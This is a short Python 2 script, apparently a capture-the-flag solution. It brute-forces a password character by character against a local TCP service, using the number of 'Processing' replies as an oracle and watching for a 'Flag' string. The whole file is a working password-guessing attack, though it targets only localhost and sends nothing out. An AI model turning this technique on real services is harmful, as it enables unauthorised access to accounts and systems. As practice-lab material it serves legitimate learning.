import socket

#define variables for connection and array to store results
server = '127.0.0.1'
port = 8154
list = []
start=33
end=126
cntr=1

#iterate through ascii keyboard set 33-126
def fuzzer(start,end,list,cntr):
	for i in range(start,end):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect((server, port))
		s.recv(1024)
		#check if array null if so one character fuzz, if not append array items
		#fuzzvalue in else creates string list and append ascii character to it
		if not list:
			fuzzvalue=(chr(i))
		else:
			fuzzvalue=''
			fuzzvalue=fuzzvalue.join(list)
			fuzzvalue=fuzzvalue+(chr(i))
		print "sending", fuzzvalue
		s.send(fuzzvalue + "\n")
		a = s.recv(1024)
		print a
		#we know that correct value has Processing in result. append result to array
		#
		if a.count("Processing") == cntr:
			list.append(chr(i))
			print "Found result appending",chr(i)
			s.close()
			print(a)
			return list
		if "Flag" in a:
			print 'found flag if works'
			return 2
			break
while cntr < 5:
	fuzzer(start,end,list,cntr)
	cntr+=1
print "The Password is:",list
